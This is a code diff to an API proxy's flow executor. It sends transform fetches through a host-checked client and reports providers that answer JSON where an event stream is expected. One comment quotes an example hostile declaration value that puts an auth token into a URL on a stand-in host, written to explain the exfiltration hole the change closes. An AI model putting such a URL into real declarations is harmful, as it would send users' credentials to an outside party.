@@ -143,12 +143,28 @@ export async function* executeFlow(options: ExecuteOptions): AsyncGenerator<UMSE
     await runStep(declaration.flow.createSession, 'flow.createSession');
   }
 
+  // Transforms fetch through the engine's own client, never through a global fetch.
+  // Two reasons, and both were holes until this line existed: a transform reaching the
+  // network directly cannot be recorded or replayed, and a declaration is data that may
+  // come from a stranger — `wasmUrl: https://mine.test/collect?c={{auth.token}}` would
+  // otherwise be an exfiltration channel that no host check ever saw.
+  const transformContext: TransformContext = {
+    ...options.transformContext,
+    fetchBytes: async (url: string) => {
+      assertAllowedHost(declaration, channel, url, 'vars');
+      return readAllBytes(
+        (await options.http.stream({ method: 'GET', url, headers: {}, signal: options.signal }))
+          .stream,
+      );
+    },
+  };
+
   for (const [name, spec] of Object.entries(declaration.vars)) {
     const rendered = renderValue(spec.with, context());
     vars[name] = await options.transforms.run(
       spec.transform,
       (rendered.value ?? {}) as Record<string, unknown>,
-      options.transformContext,
+      transformContext,
     );
   }
 
@@ -195,6 +211,28 @@ export async function* executeFlow(options: ExecuteOptions): AsyncGenerator<UMSE
           ? 'Wait for the quota to reset, or add another account.'
           : 'Run omniproxy doctor; if the endpoint is gone, re-record the scenario.',
       retryable: streamed.status === 429 ? 'other-account' : 'same-account',
+      provider: declaration.id,
+      channel: channel.id,
+    });
+  }
+
+  // A provider that promised an event stream and answered with JSON is not streaming
+  // an empty answer — it is reporting something, usually a quota, inside a 200. The
+  // error rules never saw it before, because they only ran on status >= 400, and the
+  // user got "the provider streamed no text" instead of "this account is out of quota".
+  if (expectsEventStream(send.stream.format) && !looksLikeEventStream(streamed.headers)) {
+    const body = await readAll(streamed.stream);
+    throwOnErrorRules(declaration, streamed.status, body, 'flow.send');
+    throw new DeclarationExecutionError('flow.send did not return an event stream', {
+      code: 'upstream_schema_changed',
+      message:
+        `${declaration.id} answered ${streamed.status} with ` +
+        `${streamed.headers['content-type'] ?? 'no content type'} where the declaration ` +
+        `expects ${send.stream.format}: ${body.slice(0, 200)}`,
+      userAction:
+        'Add an error rule for this response shape if it is a known condition, or ' +
+        're-record the scenario: omniproxy capture record.',
+      retryable: 'same-account',
       provider: declaration.id,
       channel: channel.id,
     });
@@ -595,6 +633,40 @@ async function* emitNonStreamed(
 
   const finish = map?.finish ? selectJsonPath(parsed, map.finish) : undefined;
   yield { type: 'done', finishReason: normaliseFinish(typeof finish === 'string' ? finish : undefined) };
+}
+
+/**
+ * Formats whose transport is unambiguous: both are carried over `text/event-stream`
+ * and nothing else. `ndjson` and `plain` are deliberately absent — providers serve
+ * them under `application/json`, `text/plain` and worse, so there is no signal here
+ * worth acting on, and guessing would turn a working provider into a broken one.
+ */
+function expectsEventStream(format: string): boolean {
+  return format === 'sse' || format === 'json-patch';
+}
+
+function looksLikeEventStream(headers: Record<string, string>): boolean {
+  const contentType = headers['content-type'];
+  // No content type at all is not evidence of anything; let the framer decide.
+  if (contentType === undefined) return true;
+  return contentType.toLowerCase().includes('event-stream');
+}
+
+/** Concatenates a stream into bytes, keeping them bytes: a WASM module is not text. */
+async function readAllBytes(stream: AsyncIterable<Uint8Array>): Promise<Uint8Array> {
+  const chunks: Uint8Array[] = [];
+  let length = 0;
+  for await (const chunk of stream) {
+    chunks.push(chunk);
+    length += chunk.length;
+  }
+  const all = new Uint8Array(length);
+  let offset = 0;
+  for (const chunk of chunks) {
+    all.set(chunk, offset);
+    offset += chunk.length;
+  }
+  return all;
 }
 
 async function readAll(stream: AsyncIterable<Uint8Array>): Promise<string> {
